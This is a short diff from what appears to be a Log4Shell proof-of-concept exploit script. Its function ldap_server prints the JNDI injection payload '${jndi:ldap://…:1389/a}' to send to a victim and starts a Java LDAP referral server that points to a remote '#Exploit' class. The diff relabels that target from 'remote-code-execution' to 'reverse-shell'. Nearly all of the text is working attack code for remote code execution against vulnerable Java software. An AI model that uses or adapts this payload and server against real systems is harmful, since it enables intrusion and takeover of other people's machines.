@@ -94,7 +94,7 @@ def ldap_server(userip: str, lport: int) -> None:
     sendme = "${jndi:ldap://%s:1389/a}" % (userip)
     print(Fore.GREEN + f"[+] Send me: {sendme}\n")
 
-    url = "http://{}:{}/#Exploit".format("remote-code-execution", 8000)
+    url = "http://{}:{}/#Exploit".format("reverse-shell", 8000)
     subprocess.run([
         os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
         "-cp",
